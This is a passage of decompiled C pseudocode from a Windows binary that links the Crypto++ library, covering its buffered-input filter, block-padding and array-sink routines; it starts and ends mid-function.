  v1 = this[6];
  v2 = this[4];
  if ( v1 < v2 )
    return 0;
  result = this[7];
  v4 = result + v2;
  if ( result + v2 == this[3] + this[2] )
    v4 = this[3];
  this[7] = v4;
  this[6] = v1 - v2;
  return result;
}

//----- (004537D0) --------------------------------------------------------
int __thiscall sub_4537D0(_DWORD *this, unsigned int *a2)
{
  int *v3; // eax
  _DWORD *v4; // esi
  bool v5; // cf
  unsigned int v6; // eax
  unsigned int v7; // ecx
  int v8; // ebx
  bool v9; // zf
  int v11; // [esp+Ch] [ebp-4h] BYREF

  v3 = &v11;
  v4 = this + 6;
  v5 = this[6] < (unsigned int)(this[2] + this[3] - this[7]);
  v11 = this[2] + this[3] - this[7];
  if ( v5 )
    v3 = this + 6;
  v6 = *v3;
  v7 = *a2;
  if ( v6 < *a2 )
    v7 = v6;
  *a2 = v7;
  v8 = this[7];
  this[7] = v7 + v8;
  v9 = *v4 == *a2;
  *v4 -= *a2;
  if ( v9 || v7 + v8 == this[2] + this[3] )
    this[7] = this[3];
  return v8;
}

//----- (00453830) --------------------------------------------------------
char __thiscall sub_453830(_BYTE *this)
{
  if ( this[16] || (*(unsigned __int8 (__thiscall **)(_BYTE *))(*(_DWORD *)this + 68))(this) )
    return 0;
  this[16] = 1;
  return 1;
}

//----- (00453850) --------------------------------------------------------
int __thiscall sub_453850(_DWORD *this, int a2, int a3, size_t a4)
{
  size_t v4; // esi
  int result; // eax

  v4 = a4;
  if ( this[3] < a4 )
  {
    result = (*(int (__thiscall **)(int, int, size_t *))(*(_DWORD *)a2 + 136))(a2, a3, &a4);
    if ( a4 >= v4 )
      return result;
    sub_418EE0(this + 1, v4);
  }
  return this[4];
}

//----- (00453890) --------------------------------------------------------
int __thiscall sub_453890(_DWORD *this, int a2, int a3, unsigned int a4, size_t a5)
{
  unsigned int v6; // edi
  int result; // eax

  v6 = a4;
  if ( this[3] < a4 )
  {
    result = (*(int (__thiscall **)(int, int, unsigned int *))(*(_DWORD *)a2 + 136))(a2, a3, &a4);
    if ( a4 >= v6 )
      return result;
    sub_418EE0(this + 1, a5);
  }
  return this[4];
}

//----- (004538D0) --------------------------------------------------------
int __thiscall sub_4538D0(_DWORD *this, int a2, int a3, size_t a4, size_t a5, size_t *a6)
{
  size_t *v7; // edi
  size_t v8; // eax
  int result; // eax

  v7 = a6;
  v8 = this[3];
  if ( v8 < a4 )
  {
    result = (*(int (__thiscall **)(int, int, size_t *))(*(_DWORD *)a2 + 136))(a2, a3, &a5);
    if ( a5 >= a4 )
    {
      *v7 = a5;
      return result;
    }
    sub_418EE0(this + 1, *v7);
    v8 = this[3];
  }
  *v7 = v8;
  return this[4];
}

//----- (00453920) --------------------------------------------------------
int __thiscall sub_453920(_DWORD *this, int a2, int a3)
{
  int v4; // eax
  int result; // eax
  int v6; // eax

  v4 = *this;
  this[5] = 0;
  this[4] = 0;
  result = (*(int (__stdcall **)(int))(v4 + 32))(a2);
  if ( a3 )
  {
    v6 = (*(int (__thiscall **)(_DWORD *))(*this + 168))(this);
    return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v6 + 44))(v6, a2, a3 - 1);
  }
  return result;
}

//----- (00453970) --------------------------------------------------------
void __thiscall sub_453970(int this, int a2, int a3)
{
  int v3; // eax

  if ( *(_BYTE *)(this + 16) )
  {
    v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 168))(*(_DWORD *)(this + 12));
    (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v3 + 44))(v3, a2, a3);
  }
}

//----- (00453990) --------------------------------------------------------
int __thiscall sub_453990(int this, int a2, _DWORD *a3, _DWORD *a4, int *a5)
{
  int v6; // esi
  bool v7; // al
  char *v8; // eax
  _DWORD *v9; // eax
  char *v10; // eax
  _DWORD *v11; // eax
  int *v12; // esi
  unsigned int v13; // ebx
  int v14; // eax
  int v15; // edx
  int result; // eax
  char *v17; // eax
  int v18; // [esp+18h] [ebp-C4h] BYREF
  char v19[24]; // [esp+1Ch] [ebp-C0h] BYREF
  char v20[24]; // [esp+34h] [ebp-A8h] BYREF
  char pExceptionObject[40]; // [esp+4Ch] [ebp-90h] BYREF
  char v22[24]; // [esp+74h] [ebp-68h] BYREF
  char v23[24]; // [esp+8Ch] [ebp-50h] BYREF
  char v24[40]; // [esp+A4h] [ebp-38h] BYREF
  int v25; // [esp+D8h] [ebp-4h]

  v6 = 5;
  if ( (*(unsigned __int8 (__thiscall **)(int, const char *, void *, int *))(*(_DWORD *)a2 + 4))(
         a2,
         "BlockPaddingScheme",
         &enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme `RTTI Type Descriptor',
         &v18) )
  {
    v6 = v18;
  }
  v7 = *(_DWORD *)(this + 104) > 1u
    && !(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 96) + 40))(*(_DWORD *)(this + 96));
  if ( v6 == 5 )
    v6 = 2 * v7;
  *(_DWORD *)(this + 100) = v6;
  if ( !v7 )
  {
    switch ( v6 )
    {
      case 2:
        v17 = (char *)(*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(this + 96) + 8))(
                        *(_DWORD *)(this + 96),
                        v23);
        v25 = 0;
        v9 = (_DWORD *)sub_421FB0((int)v22, "StreamTransformationFilter: PKCS_PADDING cannot be used with ", v17);
        LOBYTE(v25) = 1;
LABEL_24:
        sub_405230(v24, v9);
        _CxxThrowException(v24, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
      case 4:
        v8 = (char *)(*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(this + 96) + 8))(*(_DWORD *)(this + 96), v22);
        v25 = 2;
        v9 = (_DWORD *)sub_421FB0((int)v23, "StreamTransformationFilter: W3C_PADDING cannot be used with ", v8);
        LOBYTE(v25) = 3;
        goto LABEL_24;
      case 3:
        v10 = (char *)(*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(this + 96) + 8))(
                        *(_DWORD *)(this + 96),
                        v20);
        v25 = 4;
        v11 = (_DWORD *)sub_421FB0(
                          (int)v19,
                          "StreamTransformationFilter: ONE_AND_ZEROS_PADDING cannot be used with ",
                          v10);
        LOBYTE(v25) = 5;
        sub_405230(pExceptionObject, v11);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
  }
  *a3 = 0;
  *a4 = *(_DWORD *)(this + 104);
  v12 = *(int **)(this + 96);
  v13 = *(_DWORD *)(this + 100);
  v14 = (*(int (__thiscall **)(int *))(*v12 + 40))(v12);
  v15 = *v12;
  if ( v14 )
  {
    result = (*(int (__thiscall **)(int *))(v15 + 40))(v12);
  }
  else if ( (unsigned int)(*(int (__thiscall **)(int *))(v15 + 16))(v12) <= 1
         || (*(unsigned __int8 (__thiscall **)(int *))(*v12 + 60))(v12)
         || v13 < 2 )
  {
    result = 0;
  }
  else
  {
    result = (*(int (__thiscall **)(int *))(*v12 + 16))(v12);
  }
  *a5 = result;
  return result;
}
// 453990: using guessed type char var_A8[24];
// 453990: using guessed type char var_C0[24];

//----- (00453B80) --------------------------------------------------------
char __thiscall sub_453B80(unsigned int *this, char a2, char a3)
{
  char pExceptionObject[40]; // [esp+8h] [ebp-50h] BYREF
  size_t v6[10]; // [esp+30h] [ebp-28h] BYREF

  if ( !a3 )
  {
    sub_419B80((int)v6, "FilterWithBufferedInput");
    v6[9] = 0;
    sub_452740(pExceptionObject, v6);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUBlockingInputOnly_BufferedTransformation_CryptoPP__);
  }
  if ( a2 )
    sub_4536C0(this);
  (*(void (__thiscall **)(unsigned int *))(*this + 236))(this);
  return 0;
}

//----- (00453C20) --------------------------------------------------------
char __thiscall sub_453C20(_DWORD *this, int a2, int a3)
{
  int v3; // ecx

  v3 = this[18];
  if ( v3 )
    return (*(int (__thiscall **)(int, int, int, int))(*(_DWORD *)v3 + 48))(v3, a2, -1, a3);
  else
    return 0;
}

//----- (00453C40) --------------------------------------------------------
int __thiscall sub_453C40(_DWORD *this, int *a2)
{
  int v3; // eax
  int result; // eax
  int v5; // [esp+8h] [ebp-58h] BYREF
  int v6; // [esp+Ch] [ebp-54h]
  char pExceptionObject[40]; // [esp+10h] [ebp-50h] BYREF
  _DWORD v8[10]; // [esp+38h] [ebp-28h] BYREF

  v3 = *a2;
  v5 = 0;
  v6 = 0;
  if ( !(*(unsigned __int8 (__thiscall **)(int *, const char *, void *, int *))(v3 + 4))(
          a2,
          "OutputBuffer",
          &CryptoPP::ByteArrayParameter `RTTI Type Descriptor',
          &v5) )
  {
    sub_419B80((int)v8, "ArraySink: missing OutputBuffer argument");
    v8[9] = 0;
    sub_405230(pExceptionObject, v8);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  this[3] = v5;
  result = v6;
  this[4] = v6;
  return result;
}

//----- (00453CF0) --------------------------------------------------------
int __thiscall sub_453CF0(int *this, int a2)
{
  (*(void (__thiscall **)(int *, int))(this[30] + 32))(this + 30, a2);
  return sub_453D10(this, a2);
}

//----- (00453D10) --------------------------------------------------------
int __thiscall sub_453D10(int *this, int a2)
{
  _DWORD *v3; // ebx
  int *v4; // esi
  int result; // eax
  char pExceptionObject[40]; // [esp+10h] [ebp-50h] BYREF
  _DWORD v7[10]; // [esp+38h] [ebp-28h] BYREF

  v3 = this + 8;
  v4 = this + 6;
  (*(void (__thiscall **)(int *, int, int *, int *, int *))(*this + 208))(this, a2, this + 6, this + 7, this + 8);
  if ( *v4 == -1 || !this[7] || *v3 == -1 )
  {
    sub_419B80((int)v7, "FilterWithBufferedInput: invalid buffer size");
    v7[9] = 0;
    sub_405230(pExceptionObject, v7);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  result = sub_454E50(this + 10, 1, *v4);
  *((_BYTE *)this + 36) = 0;
  return result;
}

//----- (00453DD0) --------------------------------------------------------
int __thiscall sub_453DD0(int this, int a2)
{
  int v2; // esi
  char v4; // al
  int result; // eax

  v2 = a2;
  v4 = (*(int (__thiscall **)(int, const char *, bool *, int *))(*(_DWORD *)a2 + 4))(
         a2,
         "PutMessage",
         &bool `RTTI Type Descriptor',
         &a2);
  *(_BYTE *)(this + 48) = v4 != 0 ? a2 : 0;
  if ( !(*(unsigned __int8 (__thiscall **)(int, const char *, int *, int *))(*(_DWORD *)v2 + 4))(
          v2,
          "TruncatedDigestSize",
          &int `RTTI Type Descriptor',
          &a2)
    || (result = a2, a2 < 0) )
  {
    result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 44) + 32))(*(_DWORD *)(this + 44));
  }
  *(_DWORD *)(this + 52) = result;
  return result;
}
// 4ED864: using guessed type bool bool `RTTI Type Descriptor';
// 4EE1D4: using guessed type int int `RTTI Type Descriptor';

//----- (00453E30) --------------------------------------------------------
int __fastcall sub_453E30(_DWORD *a1, int a2, char *a3, size_t a4)
{
  sub_453E60(a1, a2, a3, a4);
  return (*(int (__thiscall **)(_DWORD *, _DWORD, _DWORD, int, int))(a1[30] + 24))(a1 + 30, 0, 0, -1, 1);
}

//----- (00453E60) --------------------------------------------------------
int __fastcall sub_453E60(_DWORD *a1, int a2, char *a3, size_t Size)
{
  bool v5; // zf
  char *v6; // esi
  size_t v7; // ebx
  size_t v8; // edx
  int v9; // eax
  int v10; // ecx
  int v11; // edx
  size_t v12; // ebx
  int v13; // eax
  int v14; // edx
  int v15; // ebx
  int v16; // eax
  int result; // eax
  size_t v18; // esi
  char v19; // al
  int v20; // eax
  char *v21; // ecx
  int v22; // eax
  int v23; // edi
  int v24; // ecx
  int v25; // eax
  int v26; // eax
  int v27; // eax
  int v28; // ecx
  char *v29; // esi
  char *v30; // ecx
  int v31; // eax
  int v32; // esi
  int v33; // eax
  unsigned __int8 v34; // dl
  _BYTE *v35; // ebx
  _BYTE *v36; // eax
  int v37; // eax
  unsigned __int8 v38; // cl
  bool v39; // cf
  size_t v40; // [esp-4h] [ebp-A0h]
  size_t v41; // [esp-4h] [ebp-A0h]
  void *v42; // [esp+10h] [ebp-8Ch] BYREF
  unsigned int v43; // [esp+14h] [ebp-88h]
  void *Src; // [esp+18h] [ebp-84h]
  unsigned int v45; // [esp+1Ch] [ebp-80h]
  int v46; // [esp+20h] [ebp-7Ch]
  char pExceptionObject[40]; // [esp+24h] [ebp-78h] BYREF
  char v48[40]; // [esp+4Ch] [ebp-50h] BYREF
  _DWORD v49[6]; // [esp+74h] [ebp-28h] BYREF
  int v50; // [esp+98h] [ebp-4h]

  v46 = (int)a1;
  v5 = *((_BYTE *)a1 + 116) == 0;
  v6 = a3;
  v7 = Size;
  Src = a3;
  if ( !v5 )
  {
    v8 = Size % a1[26];
    Src = (void *)a1[28];
    v9 = *a1;
    v46 = v8;
    v10 = (*(int (__thiscall **)(_DWORD *))(v9 + 168))(a1);
    v42 = Src;
    if ( a1[21] < (unsigned int)Src )
    {
      v11 = (*(int (__thiscall **)(int, int *, void **))(*(_DWORD *)v10 + 136))(v10, &dword_4EEDC0, &v42);
      v45 = v11;
      if ( v42 >= Src )
        goto LABEL_6;
      sub_418EE0(a1 + 19, (size_t)Src);
    }
    v11 = a1[22];
    v45 = v11;
LABEL_6:
    v12 = Size - v46;
    if ( Size != v46 )
    {
      (*(void (__thiscall **)(_DWORD, int, char *, size_t))(*(_DWORD *)a1[24] + 32))(a1[24], v11, a3, v12);
      v13 = (*(int (__thiscall **)(_DWORD *))(*a1 + 168))(a1);
      (*(void (__thiscall **)(int, unsigned int, size_t, _DWORD, int))(*(_DWORD *)v13 + 24))(v13, v45, v12, 0, 1);
      v6 = &a3[v12];
    }
    v14 = a1[28];
    v15 = v45;
    Src = *(void **)(*(_DWORD *)a1[24] + 36);
    if ( v46 )
      ((void (__stdcall *)(unsigned int, int, char *, int))Src)(v45, v14, v6, v46);
    else
      ((void (__stdcall *)(unsigned int, int, _DWORD, _DWORD))Src)(v45, v14, 0, 0);
LABEL_10:
    v16 = (*(int (__thiscall **)(_DWORD *))(*a1 + 168))(a1);
    return (*(int (__cdecl **)(int))(*(_DWORD *)v16 + 24))(v15);
  }
  result = a1[25];
  switch ( result )
  {
    case 0:
    case 1:
      if ( Size )
      {
        v18 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)a1[24] + 40))(a1[24]);
        v19 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)a1[24] + 60))(a1[24]);
        if ( v19 && a1[25] == 1 && (!v18 || Size < v18) )
        {
          if ( v18 < a1[26] )
            v18 = a1[26];
          v20 = (*(int (__fastcall **)(_DWORD *))(*a1 + 168))(a1);
          v21 = (char *)sub_453850(a1 + 18, v20, (int)&dword_4EEDC0, v18);
          v46 = (int)v21;
          if ( Src )
          {
            memmove(v21, Src, Size);
            v21 = (char *)v46;
          }
          memset(&v21[Size], 0, v18 - Size);
          v15 = v46;
          (*(void (__thiscall **)(_DWORD, int, size_t, int, size_t))(*(_DWORD *)a1[24] + 36))(
            a1[24],
            v46,
            v18,
            v46,
            v18);
          goto LABEL_10;
        }
        if ( !v18 )
        {
          if ( v19 )
          {
            sub_419B80(
              (int)v49,
              "StreamTransformationFilter: plaintext length is not a multiple of block size and NO_PADDING is specified");
            v50 = 0;
            sub_405360(v48, v49);
            _CxxThrowException(v48, (_ThrowInfo *)&_TI3_AVInvalidDataFormat_CryptoPP__);
          }
          sub_419B80((int)v49, "StreamTransformationFilter: ciphertext length is not a multiple of block size");
          v50 = 1;
          sub_436000(v48, v49);
          _CxxThrowException(v48, (_ThrowInfo *)&_TI4_AVInvalidCiphertext_CryptoPP__);
        }
        v22 = (*(int (__thiscall **)(_DWORD *, int *, size_t, _DWORD))(*a1 + 168))(a1, &dword_4EEDC0, Size, a1[27]);
        v23 = sub_453890(a1 + 18, v22, (int)v42, v43, (size_t)Src);
        Src = (void *)Size;
        v43 = Size;
        v24 = *(_DWORD *)(v46 + 96);
        v42 = (void *)Size;
        (*(void (__thiscall **)(int, int))(*(_DWORD *)v24 + 36))(v24, v23);
        v25 = (*(int (__thiscall **)(int))(*(_DWORD *)v46 + 168))(v46);
        result = (*(int (__cdecl **)(int))(*(_DWORD *)v25 + 24))(v23);
      }
      break;
    case 2:
    case 3:
    case 4:
      v40 = a1[27];
      v45 = a1[26];
      v26 = (*(int (**)(void))(*a1 + 168))();
      v27 = sub_453890(a1 + 18, v26, (int)&dword_4EEDC0, v45, v40);
      v28 = a1[24];
      v29 = (char *)v27;
      v46 = v27;
      if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v28 + 60))(v28) )
      {
        if ( Src )
          memmove(v29, Src, Size);
        v30 = &v29[Size];
        if ( a1[25] == 2 )
        {
          memset(&v29[Size], (unsigned __int8)(v45 - Size), v45 - Size);
        }
        else
        {
          v41 = v45 - Size - 1;
          if ( a1[25] == 4 )
          {
            memset(&v29[Size], 0, v41);
            v29[v45 - 1] = v45 - Size;
          }
          else
          {
            *v30 = 0x80;
            memset(v30 + 1, 0, v41);
          }
        }
        (*(void (__thiscall **)(_DWORD, int, int, unsigned int))(*(_DWORD *)a1[24] + 32))(a1[24], v46, v46, v45);
        v31 = (*(int (__thiscall **)(_DWORD *))(*a1 + 168))(a1);
        result = (*(int (__cdecl **)(int))(*(_DWORD *)v31 + 24))(v46);
      }
      else
      {
        if ( Size != v45 )
        {
          sub_419B80((int)v49, "StreamTransformationFilter: ciphertext length is not a multiple of block size");
          v50 = 2;
          sub_436000(v48, v49);
          _CxxThrowException(v48, (_ThrowInfo *)&_TI4_AVInvalidCiphertext_CryptoPP__);
        }
        v32 = v46;
        (*(void (__thiscall **)(_DWORD, int, void *, unsigned int))(*(_DWORD *)a1[24] + 32))(a1[24], v46, Src, v45);
        v33 = a1[25];
        if ( v33 == 2 )
        {
          v34 = *(_BYTE *)(v46 + v45 - 1);
          v35 = (_BYTE *)(v46 + v45);
          HIBYTE(v43) = v34;
          if ( !v34 )
            goto LABEL_57;
          v46 = v34;
          if ( v34 > v45 )
            goto LABEL_57;
          v36 = (_BYTE *)(v45 + v32 - v46);
          if ( v36 != v35 )
          {
            do
            {
              if ( v34 != *v36 )
                break;
              ++v36;
            }
            while ( v36 != v35 );
            if ( v36 != v35 )
            {
LABEL_57:
              sub_419B80((int)v49, "StreamTransformationFilter: invalid PKCS #7 block padding found");
              v50 = 3;
              sub_436000(v48, v49);
              _CxxThrowException(v48, (_ThrowInfo *)&_TI4_AVInvalidCiphertext_CryptoPP__);
            }
          }
        }
        else if ( v33 == 4 )
        {
          v38 = *(_BYTE *)(v46 + v45 - 1);
          if ( !v38 || v38 > v45 )
          {
            sub_419B80((int)v49, "StreamTransformationFilter: invalid W3C block padding found");
            v50 = 4;
            sub_436000(v48, v49);
            _CxxThrowException(v48, (_ThrowInfo *)&_TI4_AVInvalidCiphertext_CryptoPP__);
          }
        }
        else
        {
          if ( Size > 1 )
          {
            do
            {
              if ( *(_BYTE *)(v7 + v46 - 1) )
                break;
              v39 = v7-- == 1;
            }
            while ( !v39 && v7 != 1 );
          }
          if ( *(_BYTE *)(v7 - 1 + v46) != 0x80 )
          {
            sub_419B80((int)v49, "StreamTransformationFilter: invalid ones-and-zeros padding found");
            v50 = 5;
            sub_436000(pExceptionObject, v49);
            _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVInvalidCiphertext_CryptoPP__);
          }
        }
        v37 = (*(int (__thiscall **)(_DWORD *))(*a1 + 168))(a1);
        result = (*(int (__cdecl **)(int))(*(_DWORD *)v37 + 24))(v32);
      }
      break;
    default:
      return result;
  }
  return result;
}
// 4EEDC0: using guessed type int dword_4EEDC0;
// 453E60: using guessed type _DWORD var_28[6];

//----- (00454340) --------------------------------------------------------
bool __thiscall sub_454340(_DWORD *this, int a2, int a3)
{
  int v4; // eax
  int v6; // eax
  char v7; // al
  int v8; // ecx

  v4 = this[5];
  if ( v4 )
  {
    if ( v4 != 1 )
      return 0;
  }
  else if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int))(*this + 40))(this, a3) )
  {
    return 1;
  }
  if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 188))(this) )
    return 0;
  if ( a2
    && (v6 = (*(int (__thiscall **)(_DWORD *))(*this + 168))(this),
        (*(unsigned __int8 (__thiscall **)(int, int *, int, int))(*(_DWORD *)v6 + 152))(v6, &dword_4EEDC0, a2 - 1, a3)) )
  {
    v7 = 1;
    v8 = 1;
  }
  else
  {
    v7 = 0;
    v8 = 0;
  }
  this[5] = v8;
  return v7 != 0;
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (004543D0) --------------------------------------------------------
char __thiscall sub_4543D0(int this, int a2, int a3)
{
  int v3; // eax

  if ( !*(_BYTE *)(this + 16) )
    return 0;
  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 168))(*(_DWORD *)(this + 12));
  return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v3 + 52))(v3, a2, a3);
}

//----- (004543F0) --------------------------------------------------------
int __thiscall sub_4543F0(int this, int a2)
{
  int v3; // ebx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  int result; // eax

  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_BYTE *)(a2 + 9) = *(_BYTE *)(this + 9);
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *(_DWORD *)(this + 12);
  *(_DWORD *)(this + 12) = 0;
  v4 = *(void (__thiscall ****)(_DWORD, int))(a2 + 12);
  if ( v4 )
    (**v4)(v4, 1);
  *(_DWORD *)(a2 + 12) = v3;
  *(_BYTE *)(this + 9) = 1;
  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme>::`vftable';
  result = *(_DWORD *)(this + 16);
  *(_DWORD *)(a2 + 16) = result;
  return result;
}
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4BBE08: using guessed type void *CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme>::`vftable';

//----- (00454490) --------------------------------------------------------
_DWORD *sub_454490()
{
  _DWORD *v0; // eax

  v0 = operator new(0x60u);
  if ( v0 )
    return sub_4669A0(v0, 256);
  else
    return 0;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00454500) --------------------------------------------------------
int __thiscall sub_454500(int *this, int a2, int a3, char a4)
{
  int v4; // eax

  v4 = *this;
  if ( a4 )
    return (*(int (__stdcall **)(int, int))(v4 + 228))(a2, a3);
  else
    return (*(int (__stdcall **)(int, int))(v4 + 224))(a2, a3);
}

//----- (00454530) --------------------------------------------------------
int __thiscall sub_454530(_DWORD *this, int a2, int a3)
{
  int v3; // ecx
  int result; // eax

  v3 = this[18];
  if ( v3 )
    return (*(int (__thiscall **)(int, int, int, _DWORD, int))(*(_DWORD *)v3 + 28))(v3, a2, a3, 0, 1);
  return result;
}

//----- (00454550) --------------------------------------------------------
int __thiscall sub_454550(_DWORD **this, int a2, int a3)
{
  int v4; // eax

  (*(void (__thiscall **)(_DWORD *, int, int, int))(*this[24] + 32))(this[24], a2, a2, a3);
  v4 = ((int (__thiscall *)(_DWORD **))(*this)[42])(this);
  return (*(int (__thiscall **)(int, int, int, _DWORD, int))(*(_DWORD *)v4 + 28))(v4, a2, a3, 0, 1);
}

//----- (00454590) --------------------------------------------------------
int __thiscall sub_454590(_DWORD *this, int a2, int a3)
{
  int i; // ebx
  int result; // eax

  for ( i = a3; i; i -= this[7] )
  {
    result = (*(int (__thiscall **)(_DWORD *, int))(*this + 220))(this, a2);
    a2 += this[7];
  }
  return result;
}

//----- (004545C0) --------------------------------------------------------
int __thiscall sub_4545C0(_DWORD *this, int a2, int a3)
{
  int v3; // ecx
  int result; // eax

  v3 = this[18];
  if ( v3 )
    return (*(int (__thiscall **)(int, int, int, _DWORD, int))(*(_DWORD *)v3 + 24))(v3, a2, a3, 0, 1);
  return result;
}

//----- (004545E0) --------------------------------------------------------
int __userpurge sub_4545E0@<eax>(int *a1@<ecx>, int a2@<ebp>, int a3@<esi>, int a4, unsigned int a5)
{
  int result; // eax
  unsigned int v6; // edi
  unsigned int v8; // ebp
  int v9; // edx
  int v10; // eax
  unsigned int v11; // esi
  int v12; // eax
  void *v13; // ecx
  void *v14; // edx
  unsigned int v15; // esi
  int v16; // eax
  unsigned int v17; // [esp+10h] [ebp-28h]
  unsigned int v18; // [esp+14h] [ebp-24h]
  int v19; // [esp+24h] [ebp-14h]
  int v20; // [esp+28h] [ebp-10h]
  unsigned int v21; // [esp+2Ch] [ebp-Ch]
  int v22[2]; // [esp+30h] [ebp-8h] BYREF
  void *retaddr; // [esp+38h] [ebp+0h]

  result = a4;
  v6 = a5;
  v19 = a4;
  v21 = a5;
  if ( a5 )
  {
    v8 = (*(int (__thiscall **)(int, int, int))(*(_DWORD *)a1[24] + 16))(a1[24], a3, a2);
    while ( 1 )
    {
      v9 = *a1;
      v22[0] = a1[27];
      v10 = (*(int (__thiscall **)(int *, unsigned int, unsigned int))(v9 + 168))(a1, v17, v18);
      v11 = a1[21];
      if ( v11 >= v8 )
        goto LABEL_11;
      v12 = (*(int (__thiscall **)(int, int *, int *))(*(_DWORD *)v10 + 136))(v10, &dword_4EEDC0, v22);
      v11 = v22[0];
      v20 = v12;
      if ( v22[0] < v8 )
        break;
LABEL_12:
      if ( v11 >= v6 )
      {
        v15 = v6;
      }
      else
      {
        if ( v11 == a1[27] )
          v11 -= (*(int (__thiscall **)(int))(*(_DWORD *)a1[24] + 24))(a1[24]);
        if ( !v8 || ((v8 - 1) & v8) != 0 )
          v15 = v11 - v11 % v8;
        else
          v15 = v11 - (v11 & (v8 > 1 ? v8 - 1 : 0));
      }
      v18 = v15;
      v17 = v21;
      (*(void (__thiscall **)(int, int))(*(_DWORD *)a1[24] + 32))(a1[24], v20);
      v16 = (*(int (__thiscall **)(int *))(*a1 + 168))(a1);
      result = (*(int (__thiscall **)(int))(*(_DWORD *)v16 + 28))(v16);
      v19 += v15;
      v6 -= v15;
      v21 = v6;
      if ( !v6 )
        return result;
    }
    v13 = (void *)a1[21];
    v11 = (unsigned int)retaddr;
    v14 = (void *)a1[22];
    if ( v13 != retaddr )
    {
      memset(v14, 0, (unsigned int)v13);
      j_j___free_base(v14);
      if ( retaddr )
        v14 = sub_45AEA0((size_t)retaddr);
      else
        v14 = 0;
      v6 = v22[1];
    }
    a1[22] = (int)v14;
    a1[21] = (int)retaddr;
    a1[20] = -1;
LABEL_11:
    v20 = a1[22];
    goto LABEL_12;
  }
  return result;
}
// 454625: variable 'v17' is possibly undefined
// 454625: variable 'v18' is possibly undefined
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00454730) --------------------------------------------------------
int __thiscall sub_454730(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // eax
  int v9; // edx
  int result; // eax
  int v11; // ecx

  v8 = (*(int (__thiscall **)(_DWORD *))(*this + 168))(this);
  v9 = a5 - 1;
  if ( !a5 )
    v9 = 0;
  result = (*(int (__thiscall **)(int, int, int, int, int, int))(*(_DWORD *)v8 + 140))(v8, a7, a3, a4, v9, a6);
  v11 = 0;
  if ( result )
    v11 = a2;
  this[5] = v11;
  return result;
}

//----- (00454780) --------------------------------------------------------
size_t __thiscall sub_454780(_DWORD *this, void *Src, size_t a3, int a4, int a5)
{
  size_t v6; // edi
  int v7; // edx
  unsigned int v8; // eax
  int v9; // ebp
  size_t v10; // eax

  v6 = 0;
  v7 = this[3];
  if ( v7 && Src )
  {
    v8 = this[4];
    v9 = this[6];
    if ( (unsigned __int64)v8 <= *((_QWORD *)this + 3) )
      v10 = 0;
    else
      v10 = v8 - v9;
    v6 = a3;
    if ( v10 < a3 )
      v6 = v10;
    memmove_0((void *)(v7 + v9), Src, v6);
  }
  *((_QWORD *)this + 3) += v6;
  return a3 - v6;
}

//----- (004547E0) --------------------------------------------------------
unsigned int __thiscall sub_4547E0(_DWORD *this, unsigned int a2, unsigned int a3, int a4, int a5)
{
  unsigned int v6; // edi
  int v7; // edx
  unsigned int v8; // eax
  int v9; // ebp
  unsigned int v10; // eax

  v6 = 0;
  v7 = this[3];
  if ( v7 && a2 )
  {
    v8 = this[4];
    v9 = this[6];
    if ( (unsigned __int64)v8 <= *((_QWORD *)this + 3) )
      v10 = 0;
    else
      v10 = v8 - v9;
    v6 = a3;
    if ( v10 < a3 )
      v6 = v10;
    sub_45B3B0(v7 + v9, a2, v6);
  }
  *((_QWORD *)this + 3) += v6;
  return a3 - v6;
}

//----- (00454840) --------------------------------------------------------
int __thiscall sub_454840(_DWORD *this, int a2, int a3, int a4, int a5)
{
  int v6; // ebp
  int v7; // eax
  int v8; // eax
  int result; // eax
  bool v10; // zf
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // ecx
  int v16; // esi
  int v17; // edi
  int v18; // eax
  int v19; // ecx
  int v20; // eax
  int v21; // [esp-8h] [ebp-18h]
  size_t v22; // [esp+0h] [ebp-10h]
  size_t *v23; // [esp+4h] [ebp-Ch]
  int v24; // [esp+4h] [ebp-Ch]

  v6 = a4;
  v7 = this[5];
  if ( v7 )
  {
    v8 = v7 - 1;
    if ( v8 )
    {
      if ( v8 != 1 )
        return 0;
      goto LABEL_15;
    }
    goto LABEL_6;
  }
  v10 = *((_BYTE *)this + 48) == 0;
  this[4] = 0;
  if ( !v10 )
  {
LABEL_6:
